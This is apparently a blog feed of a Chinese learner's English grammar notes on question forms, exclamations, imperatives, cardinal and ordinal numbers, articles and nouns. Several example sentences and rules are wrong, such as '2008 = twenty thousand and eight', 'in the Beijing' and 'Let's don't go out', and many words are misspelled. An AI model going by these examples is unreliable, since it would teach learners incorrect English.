<li><code>Whom</code>     提问宾格人：Whom did you choose for our them leader? (你选谁当我们队长？)</li>
<li><code>What</code>     提问事情属性：What time is it? (几点了？)</li>
<li><code>When</code>     提问时间：When can we start working? (我们什么时候可以开始工作？)</li>
<li><code>Where</code>     提问地点：Where is the bathroom? (卫生间在哪里？)</li>
<li><code>Why</code>     提问原因：Why did he do it? (他为什么做这个事？)</li>
<li><code>How</code>     提问方式数量：How heavy is it? (它有多重？)</li>
<li><code>How much/many</code>     多少：How much longer? (有多远？)</li>
<li><code>Which</code>     提问选择：Which is your choice? (你选哪个？)</li>
</ul>
<h3 id="选择疑问句"><a href="#选择疑问句" class="headerlink" title="选择疑问句"></a>选择疑问句</h3><p><strong>不可用<code>yes</code>、<code>no</code>回答；选择疑问句一般用or连接，提问两个以上的句子内容供选择</strong></p>
<p><code>Do you like to play football or basketaball?</code> (你喜欢踢足球还是打篮球？)<br>回答：<code>I like to play football/I like to play basketball</code></p>
<h3 id="反义疑问句"><a href="#反义疑问句" class="headerlink" title="反义疑问句"></a>反义疑问句</h3><p><strong>可以用<code>yes</code>、<code>no</code>回答；前肯后否，前否后肯</strong></p>
<p>陈述句部分是肯定，疑问句部分有个否定句<br><code>He is your teacher,isn&#39;t he?</code> (他是你的老师，不是吗？)</p>
<p>陈述句部分是否定，疑问句部分用肯定句<br><code>He isn&#39;t your teacher,is he?</code> (他不是你的老师，是吗？)</p>
<p><strong>根据事实</strong>回答:<code>Yes,he is/No,he isn&#39;t</code></p>
<h4 id="祈使句反义疑问句"><a href="#祈使句反义疑问句" class="headerlink" title="祈使句反义疑问句"></a>祈使句反义疑问句</h4><p><strong>用<code>will you</code>和<code>won&#39;t you</code>的句子</strong></p>
<p><code>Open the door,won&#39;t you?</code> (打开门，不好吗？)<br><code>Don&#39;t open the door,will you?</code> (不打开门，好吗？)</p>
<p><strong>不管否定肯定，<code>let&#39;s</code>开头结尾就是<code>shall we</code>,<code>Let us</code>开头结尾就是<code>will you</code></strong></p>
<p>肯定：<code>Let&#39;s go to school,shall we?</code> <code>Let us go outside ,will you?</code><br>否定：<code>Let&#39;s don&#39;t go out,shall we?</code> <code>Don&#39;t let us go there,will you?</code></p>
<h4 id="有must反义疑问句"><a href="#有must反义疑问句" class="headerlink" title="有must反义疑问句"></a>有<code>must</code>反义疑问句</h4><p><strong>must表必须时，反义疑问用<code>mustn&#39;t?/needn&#39;t?</code></strong></p>
<p><code>He must study hard at English,mustn&#39;t he?</code> (他必须努力学英语，不是吗？)</p>
<p><strong>must表推测(肯定的)时，反义疑问句用must后动词的否定提问</strong></p>
<p><code>You must be joking,aren&#39;t you?</code> (你肯定是在开玩笑，不是吗？)</p>
<h4 id="感叹句反义疑问句"><a href="#感叹句反义疑问句" class="headerlink" title="感叹句反义疑问句"></a>感叹句反义疑问句</h4><p><strong>含有感叹句的反义疑问句，全部用感叹句陈述，用否定式提问(前肯后否)</strong></p>
<p><code>What a lovely girl,isn&#39;t she?</code> (多么可爱的女孩，不是吗？)</p>
<h4 id="含否定词的反义疑问句"><a href="#含否定词的反义疑问句" class="headerlink" title="含否定词的反义疑问句"></a>含否定词的反义疑问句</h4><p><strong>常见否定词：<code>hardly</code>、<code>never</code>、<code>seldom</code>、<code>little</code>、<code>few</code>、<code>nowhere</code>、<code>nothing</code></strong></p>
<p><strong>陈述句有否定词，反义疑问用肯定提问</strong><br><code>He hardly goes to school,does he?</code> (他几乎不去学校，是吗？)</p>
<h4 id="含复合句的反义疑问句"><a href="#含复合句的反义疑问句" class="headerlink" title="含复合句的反义疑问句"></a>含复合句的反义疑问句</h4><p>复合句反义疑问都是对主句提问与主句相关(除宾语从句)</p>
<p><code>She never told you that she had a baby,did she?</code> (她从来没有告诉过你她有一个孩子，是吗？)</p>
<h4 id="含宾语从句的反义疑问句"><a href="#含宾语从句的反义疑问句" class="headerlink" title="含宾语从句的反义疑问句"></a>含宾语从句的反义疑问句</h4><p><strong>全部复合句里，只有宾语从句的反义疑问句，是和从句相关的</strong></p>
<p><code>I don&#39;t think/believe/imagine/suppose</code>引导的宾语从句，反义疑问句与从句主语，主谓一致，用肯定提问</p>
<p><code>I don&#39;t imagine he has got it,has he?</code> (我没有想过有它，他有吗？)</p>
<h2 id="感叹句"><a href="#感叹句" class="headerlink" title="感叹句"></a>感叹句</h2><h3 id="What-感叹句"><a href="#What-感叹句" class="headerlink" title="What 感叹句"></a><code>What</code> 感叹句</h3><ul>
<li><strong>What <code>+</code> a/an <code>+</code> 形容词 <code>+</code> 可数名词单数 <code>+</code> 主语 <code>+</code> 谓语</strong></li>
</ul>
<p><code>What a beautiful photo it is!</code> (这照片它多美啊！)</p>
<ul>
<li><strong>What <code>+</code> 形容词 <code>+</code> 不可数名词/名词复数 <code>+</code> 主语 <code>+</code> 谓语</strong></li>
</ul>
<p><code>What cleanly water it is!</code> (多干净的水啊！)<br><code>What brilliant dogs they are!</code> (多聪明的狗啊！)</p>
<h3 id="How-感叹句"><a href="#How-感叹句" class="headerlink" title="How 感叹句"></a><code>How</code> 感叹句</h3><ul>
<li><p><strong>How <code>+</code> 形容词/副词 <code>+</code> 主语 <code>+</code> 谓语</strong><br><code>How careful he is!</code> (他多细心啊！)<br><code>How fast he runs!</code> (他跑得多快啊！)</p>
</li>
<li><p><strong>How <code>+</code> 形容词 <code>+</code> a/an <code>+</code> 可数名词单数 <code>+</code> 主语 <code>+</code> 谓语</strong><br><code>How cute a dog it is!</code> (它是多么可爱的一条狗啊！)</p>
</li>
</ul>
<h3 id="语气词-感叹号的感叹句"><a href="#语气词-感叹号的感叹句" class="headerlink" title="语气词+感叹号的感叹句"></a>语气词+感叹号的感叹句</h3><p><code>Wow! That&#39;s totally awesome!</code> (哇！真是厉害！)</p>
<p><code>Oh! You&#39;re Peter!</code> (哇！你是皮特！)</p>
<h2 id="祈使句"><a href="#祈使句" class="headerlink" title="祈使句"></a>祈使句</h2><h3 id="命令、警告祈使句"><a href="#命令、警告祈使句" class="headerlink" title="命令、警告祈使句"></a>命令、警告祈使句</h3><p><code>Get out!</code> (滚！)<br><code>Be quiet,please.</code> (请安静)<br><code>Be careful</code> (小心)</p>
<h3 id="请求、祝愿祈使句"><a href="#请求、祝愿祈使句" class="headerlink" title="请求、祝愿祈使句"></a>请求、祝愿祈使句</h3><p><code>Have a good day</code> (祝你有美好的一天)<br><code>Let me help you</code> (让我帮你)</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语语法冲入门掉入坑day02</title>
    <url>/2019/10/05/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95%E5%86%B2%E5%85%A5%E9%97%A8%E6%8E%89%E5%85%A5%E5%9D%91day02/</url>
    <content><![CDATA[<p><a href="https://www.bilibili.com/video/av66639463">学习出处</a></p>
<h1 id="数词"><a href="#数词" class="headerlink" title="数词"></a>数词</h1><ul>
<li>基数词</li>
<li>序数词</li>
</ul>
<h2 id="基数词"><a href="#基数词" class="headerlink" title="基数词"></a>基数词</h2><h3 id="两位数"><a href="#两位数" class="headerlink" title="两位数"></a>两位数</h3><h4 id="个位-1～9"><a href="#个位-1～9" class="headerlink" title="个位(1～9)"></a>个位(1～9)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>零</th>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
<th>七</th>
<th>八</th>
<th>九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>zero</code></td>
<td><code>one</code></td>
<td><code>two</code></td>
<td><code>three</code></td>
<td><code>four</code></td>
<td><code>five</code></td>
<td><code>six</code></td>
<td><code>seven</code></td>
<td><code>eight</code></td>
<td><code>nine</code></td>
</tr>
</tbody>
</table>
</div>
<a id="more"></a>
<h4 id="十到十九-10-19"><a href="#十到十九-10-19" class="headerlink" title="十到十九(10~19)"></a>十到十九(10~19)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>十</th>
<th>十一</th>
<th>十二</th>
<th>十三</th>
</tr>
</thead>
<tbody>
<tr>
<td><font color="#FF0000"><strong><code>ten</code></strong></font></td>
<td><font color="#FF0000"><strong><code>eleven</code></strong></font></td>
<td><font color="#FF0000"><strong><code>twelve</code></strong></font></td>
<td><font color="#FF0000"><strong><code>thirteen</code></strong></font></td>
</tr>
</tbody>
</table>
</div>
<p><strong>后面加<code>teen</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>十四</th>
<th>十五</th>
<th>十六</th>
<th>十七</th>
<th>十八</th>
<th>十九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>fourteen</code></td>
<td><code>fifteen</code></td>
<td><code>sixteen</code></td>
<td><code>seventeen</code></td>
<td><code>eighteen</code></td>
<td><code>nineteen</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="整十"><a href="#整十" class="headerlink" title="整十"></a>整十</h4><p><strong>后加<code>ty</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>二十</th>
<th>三十</th>
<th>四十</th>
<th>五十</th>
</tr>
</thead>
<tbody>
<tr>
<td><font color="#FF0000"><strong><code>twenty</code></strong></font></td>
<td><font color="#FF0000"><strong><code>thirty</code></strong></font></td>
<td><font color="#FF0000"><strong><code>forty</code></strong></font></td>
<td><font color="#FF0000"><strong><code>fifty</code></strong></font></td>
</tr>
<tr>
<td><strong>六十</strong></td>
<td><strong>七十</strong></td>
<td><strong>八十</strong></td>
<td><strong>九十</strong></td>
</tr>
<tr>
<td><code>sixty</code></td>
<td><code>seventy</code></td>
<td><code>eighty</code></td>
<td><code>ninety</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="几十几-21-99"><a href="#几十几-21-99" class="headerlink" title="几十几(21~99)"></a>几十几(21~99)</h4><p><strong>十位用整十，个位用个位，两位间用<code>-</code>相连</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>二十一</th>
<th>八十八</th>
<th>九十九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>twenty-one</code></td>
<td><code>eighty-eight</code></td>
<td><code>ninety-nine</code></td>
</tr>
</tbody>
</table>
</div>
<h3 id="大于两位"><a href="#大于两位" class="headerlink" title="大于两位"></a>大于两位</h3><p><strong>数字表达规则</strong></p>
<ul>
<li>中文划分规则 <code>10,0000,0000</code></li>
<li>英文划分规则 <code>1,000,000,000</code><ul>
<li><strong>从右往左，三位一分</strong>,第一个划分<code>thousand</code>,第二划分<code>million</code>，第三划分<code>billion</code>，第四划分<code>trillion</code></li>
<li>每个个划分间的十位和百位加<code>and</code>，数字隔<code>0</code>加<code>and</code></li>
</ul>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>十亿</th>
<th>亿</th>
<th>千万</th>
<th>百万</th>
<th>十万</th>
<th>万</th>
<th>千</th>
<th>百</th>
<th>十</th>
<th>个</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>billion</code></td>
<td><code>one hundred million</code></td>
<td><code>ten million</code></td>
<td><code>million</code></td>
<td><code>one hundred thousand</code></td>
<td><code>then thousand</code></td>
<td><code>thousand</code></td>
<td><code>hundred</code></td>
<td><code>ten</code></td>
<td><code>one</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="一百到九百九十九-100-999"><a href="#一百到九百九十九-100-999" class="headerlink" title="一百到九百九十九(100~999)"></a>一百到九百九十九(100~999)</h4><div class="table-container">
<table>
<thead>
<tr>
<th>一百 (100)</th>
<th>一百零一 (101)</th>
<th>九百九十九 (999)</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>one hundred</code></td>
<td><code>one hundred and one</code></td>
<td><code>nine hundred and ninety-nine</code></td>
</tr>
<tr>
<td></td>
<td>中间有<code>0</code>加<code>and</code></td>
<td>十位百位加<code>and</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="一千到九千九百九十九-1-000-9-999"><a href="#一千到九千九百九十九-1-000-9-999" class="headerlink" title="一千到九千九百九十九(1,000~9,999)"></a>一千到九千九百九十九(1,000~9,999)</h4><p><strong>一 千</strong> (1,00)<br><code>one hundred</code></p>
<p><strong>一 千 零 一</strong> (1,001)<br><code>one tousand and one</code></p>
<p><strong>一 千 零 二十</strong> (1,020)<br><code>one thousand adn twenty</code></p>
<p><strong>九 千 九 百 九十 九</strong> (9,999)<br><code>nine thousand nine hundred and ninety-nine</code></p>
<h4 id="一万到一万零九百九十九-10-000-10-999"><a href="#一万到一万零九百九十九-10-000-10-999" class="headerlink" title="一万到一万零九百九十九 (10,000~10,999)"></a>一万到一万零九百九十九 (10,000~10,999)</h4><p><strong>一 万</strong> (10<code>*</code>1000<code>=</code>10,000)<br><code>ten thousand</code></p>
<p><strong>一 万 零 一</strong> (10,001)<br><code>the thousand and one</code></p>
<p><strong>一 万 零 二十</strong> (10,020)<br><code>the thousand and twenty</code></p>
<p><strong>一 万 零 两 百</strong> (10,200)<br><code>the thousand and two hundred</code></p>
<p><strong>一 万 零 九 百 九十 九</strong> (10,999)<br><code>ten tousand nine hundred and ninety-nine</code></p>
<h4 id="一万一千到九万九千九百九十九-11-000-99-9999"><a href="#一万一千到九万九千九百九十九-11-000-99-9999" class="headerlink" title="一万一千到九万九千九百九十九 (11,000~99,9999)"></a>一万一千到九万九千九百九十九 (11,000~99,9999)</h4><p><strong>一万一千</strong> (11<code>*</code>1000<code>=</code>11,000 )<br><code>eleven thousand</code></p>
<p><strong>一万一千 零一</strong> (11,001)<br><code>eleven thousand and one</code></p>
<p><strong>一万一千 零二十</strong> (11,020)<br><code>elven thousand and twenty</code></p>
<p><strong>一万一千 二百</strong> (11,200)<br><code>eleven thousand two hundred</code></p>
<p><strong>九万九千九百九十九</strong> (99,999)<br><code>ninety nine thousand nine hundred and ninety-nine</code></p>
<h4 id="十万到九十九万九千九百九十九-100-000-999-999"><a href="#十万到九十九万九千九百九十九-100-000-999-999" class="headerlink" title="十万到九十九万九千九百九十九 (100,000~999,999)"></a>十万到九十九万九千九百九十九 (100,000~999,999)</h4><p><strong>十万</strong> (100<code>*</code>1000<code>=</code>100,000)<br><code>one hundred thousand</code></p>
<p><strong>十万 零一</strong> (100,001)<br><code>one hundred thousand and one</code></p>
<p><strong>十万 零 二十</strong> (100,020)<br><code>one hundred thousand and twenty</code></p>
<p><strong>十万 零 二百</strong> (100,200)<br><code>one hundred thousand and two hundred</code></p>
<p><strong>十万 零 二 千 零 一</strong> (102,001)<br><code>one hundred and tow thousand and one</code></p>
<p><strong>九万九千九百九十九</strong> (999,999)<br><code>nine hundred and ninety-nine thousand nine hundred and ninety-nine</code></p>
<h4 id="一百万到九千九百九十九万九千九百九十九-1-000-000-99-999-999"><a href="#一百万到九千九百九十九万九千九百九十九-1-000-000-99-999-999" class="headerlink" title="一百万到九千九百九十九万九千九百九十九 (1,000,000~99,999,999)"></a>一百万到九千九百九十九万九千九百九十九 (1,000,000~99,999,999)</h4><p><strong>一百万</strong> (1,000,000)<br><code>one million</code></p>
<p><strong>一百万 零 一</strong> (1,000,001)<br><code>one million and one</code></p>
<p><strong>一百万 零 一 千</strong> (1,001,000)<br><code>one million and one thousand</code></p>
<p><strong>一百 零 一万</strong> (1,010,000)<br><code>one million and ten thousand</code></p>
<p><strong>九千九百九十九万九千九百九十九</strong> (99,999,999)<br><code>ninety-nine million nine hundred and ninety-nine thousand nine hundred and ninety-nine</code></p>
<h4 id="一亿到十亿及更多-100-000-000-1-000-000-000-∞"><a href="#一亿到十亿及更多-100-000-000-1-000-000-000-∞" class="headerlink" title="一亿到十亿及更多 (100,000,000~1,000,000,000~∞)"></a>一亿到十亿及更多 (100,000,000~1,000,000,000~∞)</h4><p><strong>一亿</strong> (100,000,000)<br><code>one hundred million</code></p>
<p><strong>一亿 零 一</strong> (100,000,001)<br><code>one hundred million and one</code></p>
<p><strong>一亿 零 一 千</strong> (1000,001,000)<br><code>one hundred million and one thonsand</code></p>
<p><strong>一亿 零 一百万</strong> (101,000,000)<br><code>one hundred and one million</code></p>
<p><strong>三百一十亿零两千九十万零八百八十八</strong> (31,020,900,888)<br><code>thirty-one billion twenty million nine hundred thousand eight hundred and eight-eight</code></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li><p>作数词时，前加了数词，后面就不能加<code>s</code><br><code>two thousand</code> (√)<br><code>three thousands</code> (×)</p>
</li>
<li><p>如果数词作名词时，变成主语或别的什么成分，意识是<code>好几..</code>的时候，前面可加<code>some</code>、<code>many</code>、<code>several</code>等这词或加数词，后面可以加<code>of</code><br><code>hundreds of</code> (好几百)<br><code>five hundreds of</code> (五百左右)<br><code>many millions of</code> (数百万)</p>
</li>
<li><p>表年龄<br><code>I&#39;m twenty</code> (我20岁)</p>
</li>
<li><p>表编号<br><code>Room 101</code> = <code>Room one 0 one</code> (101房间)<br><code>Bus No.10</code> = <code>Bus Number ten</code> (10路公交车)</p>
</li>
<li><p>表年代<br><code>1940&#39;s</code> = <code>nineteen forty&#39;s</code> (20世纪40年代)</p>
</li>
<li><p>表年份<br><code>2008</code> = <code>twenty thousand and eight</code><br><code>1949</code> = <code>nineteen forty-nine</code></p>
</li>
<li><p>表时刻</p>
<p><strong>中国人描述实践习惯精确到个位分钟，外国人描述实践习惯精确到十位分钟，几分钟一般省略</strong></p>
<p><code>6:00</code> = <code>six o&#39;clock</code> = <code>six on the dot</code> (6点整)</p>
<p><code>6:05</code> = <code>six o five</code> = <code>five past six</code> (6点05分，6点过5分)</p>
<p><code>6:15</code> = <code>six fifteen</code> = <code>a quarter past six</code> (6点15分，6点一刻)</p>
<p><code>6:30</code> = <code>six thirty</code> = <code>half past six</code> (6点30分，六点半)</p>
<p><code>6:45</code> = <code>six forty-five</code> = <code>aquarter to (till) seven</code> (6点45分，七点差一刻)</p>
<p><code>6:55</code> = <code>six fifty-five</code> = <code>five to (till) seven</code> (6点55分，7点差五分)</p>
</li>
</ul>
<p>  <strong>时区：<code>aones</code></strong></p>
<p>  <strong>上午：<code>ante meridiem</code> = <code>a.m.</code></strong></p>
<p>  <strong>下午：<code>post meridiem</code> = <code>p.m.</code></strong></p>
<p>  24小时制 = <code>24-hour clock</code> = <code>military time</code><br>  (北美不使用24小时制，都是说12小时制加<code>a.m.</code>和<code>p.m.</code>)</p>
<p>  <code>21:00</code> = <code>twenty one hours</code></p>
<p>  <code>21:20</code> = <code>twenty one twenty</code></p>
<ul>
<li><p>电话号码直接读数字<br>(北美电话，区号(3)+用户号(7))<br><code>647-300-2516</code> = <code>six four seven-three double o-two five one six</code></p>
<p>两连续的<code>0</code>可读成<code>double o</code>代替</p>
</li>
<li><p>价格(经常省略<code>dollars</code>和<code>cents</code>)<br><code>nine thirty</code> = <code>nine dollars and thirty cents</code> (9.30$)<br><code>ninety-nine ninety-eifht</code> = <code>ninety-nine dollars and ninety-eight cents</code> (99.98$)</p>
</li>
<li><p>小数(经常省略<code>zero</code>,或读成<code>o</code>)<br><code>0.5</code> = <code>(zero) point five</code> (零点五)<br><code>0.05</code> = <code>zero point o five</code> (零点零五)</p>
</li>
<li><p>两一样数字，三一样数字 (double,triple)<br><code>007</code> = double o seven (零零七)<br><code>boeing 777</code> = <code>boeing triple seven</code> (波音777)</p>
</li>
</ul>
<h1 id="序数词"><a href="#序数词" class="headerlink" title="序数词"></a>序数词</h1><h2 id="第零到第九"><a href="#第零到第九" class="headerlink" title="第零到第九"></a>第零到第九</h2><p><strong>基数词后加<code>th</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第零</th>
<th>第一</th>
<th>第二</th>
<th>第三</th>
<th>第四</th>
<th>第五</th>
<th>第六</th>
<th>第七</th>
<th>第八</th>
<th>第九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>zeroth</code></td>
<td><font color="#FF0000"><strong><code>first</code></strong></font></td>
<td><font color="#FF0000"><strong><code>second</code></strong></font></td>
<td><font color="#FF0000"><strong><code>third</code></strong></font></td>
<td><code>fourth</code></td>
<td><font color="#FF0000"><strong>fifth</strong></font></td>
<td>sixth</td>
<td>seventh</td>
<td>eighth</td>
<td><font color="#FF0000"><strong><code>ninth</code></strong></font></td>
</tr>
</tbody>
</table>
</div>
<h2 id="第十到第十九"><a href="#第十到第十九" class="headerlink" title="第十到第十九"></a>第十到第十九</h2><p><strong>基数词后加<code>th</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第十</th>
<th>第十一</th>
<th>第十二</th>
<th>第十三</th>
<th>第十四</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>tenth</code></td>
<td><code>eleventh</code></td>
<td><font color="#FF0000"><strong><code>twelfth</code></strong></font></td>
<td><code>thirteenth</code></td>
<td><code>fourteenth</code></td>
</tr>
<tr>
<td><strong>第十五</strong></td>
<td><strong>第十六</strong></td>
<td><strong>第十七</strong></td>
<td><strong>第十八</strong></td>
<td><strong>第十九</strong></td>
</tr>
<tr>
<td><code>fifteenth</code></td>
<td><code>sixteenth</code></td>
<td><code>seventeenth</code></td>
<td><code>eghteenth</code></td>
<td><code>nineteenth</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="第整十"><a href="#第整十" class="headerlink" title="第整十"></a>第整十</h2><p><strong>吧基数词结尾的<code>y</code>变成<code>i</code>再加<code>eth</code></strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第二十</th>
<th>第三十</th>
<th>第四十</th>
<th>第五十</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>twentieth</code></td>
<td><code>thirtieth</code></td>
<td><code>fortieth</code></td>
<td><code>fiftieth</code></td>
</tr>
<tr>
<td><strong>第六十</strong></td>
<td><strong>第七十</strong></td>
<td><strong>第八十</strong></td>
<td><strong>第九十</strong></td>
</tr>
<tr>
<td><code>sixtieth</code></td>
<td><code>seventieth</code></td>
<td><code>eightieth</code></td>
<td><code>ninetieth</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="第几十几"><a href="#第几十几" class="headerlink" title="第几十几"></a>第几十几</h2><p><strong>十位用基数词，个位用序数词</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第二十一</th>
<th>第九十九</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>twenty first</code></td>
<td><code>ninety ninth</code></td>
</tr>
</tbody>
</table>
</div>
<h2 id="一百及以上"><a href="#一百及以上" class="headerlink" title="一百及以上"></a>一百及以上</h2><p><strong>第整十的后面加<code>th</code>,如果不是整十，保留基数词只变个位数</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>第一百</th>
<th>第一千</th>
<th>第一百万</th>
<th>第十亿</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>one hundredth</code></td>
<td><code>one thousandth</code></td>
<td><code>one million</code></td>
<td><code>one billion</code></td>
</tr>
</tbody>
</table>
</div>
<p><strong>第十亿五千万零三十一</strong> (1,050,000,031st)<br><code>one billion fifty million and third first</code></p>
<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><ul>
<li><p><strong>使用词时，一般前面要加定冠词<code>the</code></strong></p>
<p><code>I&#39;m in the second room</code> (我在第二个房间)</p>
</li>
<li><p>表时间日期<br><code>The first of September</code> = <code>Sep 1st</code> (九月一日)</p>
</li>
<li><p>表楼层<br><code>The first floot</code> (一楼)</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>说法</th>
<th>三楼（G3）</th>
<th>二楼（G2）</th>
<th>一楼（G1）</th>
<th>地下一层（B1）</th>
<th>地下二层（B2）</th>
<th>地下三层（B3）</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>英式</strong></td>
<td><code>Second floor</code></td>
<td><code>First floor</code></td>
<td><code>Ground floor</code></td>
<td><code>First basement</code></td>
<td><code>Second basement</code></td>
<td><code>Third basement</code></td>
</tr>
<tr>
<td><strong>美式</strong></td>
<td><code>Third floor</code></td>
<td><code>Second floor</code></td>
<td><code>First basement</code></td>
<td><code>Second basement</code></td>
<td><code>Third basement</code></td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>分数<br><strong>分子大于一，分母用复数形式</strong></li>
</ul>
<p><code>one third</code> = <code>1/3</code><br><code>two thirds</code> = <code>2/3</code></p>
<ul>
<li><p>序数词前加<code>a</code>/<code>an</code>表示再次，序数词前加<code>the</code>表顺序</p>
<p><code>We read the book a third times</code> (我们读了三边这本书)</p>
<p><code>The second door of the room is closed</code> (房间的第二扇门是关的)</p>
</li>
</ul>
<h1 id="冠词"><a href="#冠词" class="headerlink" title="冠词"></a>冠词</h1><p><strong>加在名词前的<code>a</code>、<code>an</code>、<code>the</code>想成特指或泛指的作用</strong></p>
<ul>
<li>点冠词 (特指)</li>
<li>不定冠词 (泛指)</li>
<li>零冠词</li>
</ul>
<h2 id="定冠词-the"><a href="#定冠词-the" class="headerlink" title="定冠词(the)"></a>定冠词(<code>the</code>)</h2><p><strong>表示这个/那个，特指某个名词，后面跟单/复数名词、不可数名词</strong></p>
<ul>
<li><p>表上文提到过的人或物<br><code>This car is popular,but the car isn&#39;t cheap</code> (这车很热门，但这车不便宜)</p>
</li>
<li><p>表地理位置<br><code>We are based in the Beijing</code> (我们的总部设在北京)</p>
</li>
<li><p>表江河湖海<br><code>The Yellow River</code> (黄河)</p>
</li>
<li><p>唯一存在的事物<br><code>The earth</code></p>
</li>
<li><p>最高级前<br><code>This is the best cup of coffee</code> (这是最后的一杯咖啡)</p>
</li>
<li><p>表强调时<br><code>Beijing is the capital of China</code> (北京是中国的首都)</p>
</li>
<li><p>乐器<br><code>I like to play the piano</code> (我喜欢弹钢琴)</p>
</li>
</ul>
<h2 id="不定冠词-a、an"><a href="#不定冠词-a、an" class="headerlink" title="不定冠词 (a、an)"></a>不定冠词 (<code>a</code>、<code>an</code>)</h2><p><strong>泛指人或物，表示一个，不知道具体是哪一个，后面加单数可数名词</strong></p>
<p><strong>辅音前加<code>a</code>，元音前加<code>an</code></strong></p>
<blockquote>
<p>元音：<br>[a]、[e]、[i]、[o]、[u]<br>元音字母：a、e、i、o、y<br>辅音：<br>除元音外的都是辅音</p>
</blockquote>
<p><strong>大多数情况可直接可直接通过字母判断是元音还是辅音，但还有些开头的不是元音字母却发元音的</strong></p>
<ul>
<li><p>第一次提到的人或物<br><code>It&#39;s a cat</code> (这是一只猫)</p>
</li>
<li><p>对唯一事物具体情况说明<br><code>Their dream is to go on a world tour</code> (他们的梦想是去全世界巡回演出)</p>
</li>
<li><p>和名词连用表语做同位语，代表职业<br><code>I am an engineer</code> (我是一个工程师)</p>
</li>
<li><p>表价格、速度、频率<br><code>80 miles an hour</code> (80 英里每小时)</p>
</li>
<li><p>国定短语<br><code>have a good time</code> (玩得开心)</p>
</li>
</ul>
<h2 id="零冠词-不加冠词"><a href="#零冠词-不加冠词" class="headerlink" title="零冠词 (不加冠词)"></a>零冠词 (不加冠词)</h2><ul>
<li><p>很广泛的概念<br><code>Sichuan dishes are spicy</code> (四川菜很辣)</p>
</li>
<li><p>书名、人名<br><code>I am reading &quot;Journey to the West&quot;</code> (我正在读西游记)</p>
</li>
<li><p>某些城市、国家<br><code>China is a big country</code> (中国是一个大国)</p>
</li>
<li><p>某些山河湖海<br><code>Asia</code> (亚洲)</p>
</li>
<li><p>星球<br><code>Mars</code> (火星)</p>
</li>
<li><p>语言、球类、学科、棋牌<br><code>I have studied English for ten years</code> (我学了十年英语)</p>
</li>
<li><p>三餐、日期、季节(一般不加冠词，如果要特指可加<code>the</code>)<br><code>It&#39;s September 1th</code> (这是九月一日)</p>
</li>
</ul>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><font color="#FF0000">**冠词不能和代词连用**</font>

<p><code>This car is popular</code> (√)<br><code>This the car is popular</code> (×)<br>(这车很热门)</p>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>英语语法冲入门掉入坑day03</title>
    <url>/2019/10/10/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95%E5%86%B2%E5%85%A5%E9%97%A8%E6%8E%89%E5%85%A5%E5%9D%91day03/</url>
    <content><![CDATA[<h1 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h1><p><strong>花式加<code>s</code></strong></p>
<ul>
<li>专有名词、普通名词</li>
<li>可数名词、不可数名词</li>
<li>具体名词、抽象名词</li>
</ul>
<h2 id="专有名词"><a href="#专有名词" class="headerlink" title="专有名词"></a>专有名词</h2><p>专有名词(大多数为不可数名词，在某些情况下可以复数使用，或转换为普通名词，单/复数使用)</p>
<a id="more"></a>
<p>人名、地名、国家、组织、单位、大型活动、著名事件等（首字母大写、若果缩写全部字母大写）</p>
<p>人名： Jack<br>地名： Beijing<br>国家： China<br>组织： CBA<br>单位： Department of Education<br>大型活动： Midi Festival<br>署名事件： Discovery of America</p>
<p>普通名词：专有名词以为的名词</p>
<p>有些情况下专有名词可复数使用(在一个范围内能被数清)，也可转换成普通名词(加不定冠词变成普通名词)</p>
<p><code>There are two Jacks in our class</code> (我们班有两个杰克)</p>
<p><code>Millions off Lei Fengs have emerged in China</code> (中国出现了数百万的活雷锋)</p>
<p><code>Hey,Tom,have a Mrs. Carl is waiting for you</code> (嘿，汤姆，有一位卡尔夫人正在等你)</p>
<h2 id="可数名词、不可数名词"><a href="#可数名词、不可数名词" class="headerlink" title="可数名词、不可数名词"></a>可数名词、不可数名词</h2><ul>
<li><p>可数名词(单数复数都可以，可以加数词计算的)</p>
<p><code>apple</code>、<code>egg</code>、<code>boy</code>、<code>tree</code>、<code>family</code>、<code>class</code>、<code>police</code>、<code>team</code>等</p>
</li>
<li><p>不可数名词(只能单数，不可以加数词计算)</p>
